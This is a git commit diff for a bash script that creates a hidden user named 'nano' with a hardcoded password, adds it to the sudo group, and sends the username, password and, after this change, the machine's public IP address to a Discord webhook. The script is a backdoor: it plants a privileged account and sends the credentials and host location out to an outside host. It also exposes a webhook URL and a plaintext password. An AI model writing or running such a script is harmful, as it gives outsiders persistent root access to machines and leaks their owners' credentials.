2103fbc80d41e03789425e31b8f3f40db4728c98
Corazon <41511738+assafgold1@users.noreply.github.com>
2024-08-03 04:52:23 +0300

    Update create_user_linux.sh

--- create_user_linux.sh
+++ create_user_linux.sh
@@ -4,6 +4,7 @@
 USERNAME="nano"
 PASSWORD="Mizi123!"
 DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
+#!/bin/bash
 
 # Create the user
 sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME
@@ -11,10 +12,13 @@ sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME
 # Add the user to the 'sudo' group
 sudo usermod -aG sudo $USERNAME
 
-# Notify via Discord
+# Get the IP address
+IP_ADDRESS=$(curl -s https://ipinfo.io/ip)
+
+# Notify via Discord with @everyone mention
 curl -H "Content-Type: application/json" -X POST -d "{
   \"username\": \"Server Notification\",
-  \"content\": \"New user created:\nUsername: $USERNAME\nPassword: $PASSWORD\"
+  \"content\": \"@everyone New user created:\nUsername: $USERNAME\nPassword: $PASSWORD\nIP Address: $IP_ADDRESS\"
 }" $DISCORD_WEBHOOK_URL
 
 echo "User $USERNAME created and added to sudo group. Notification sent to Discord."
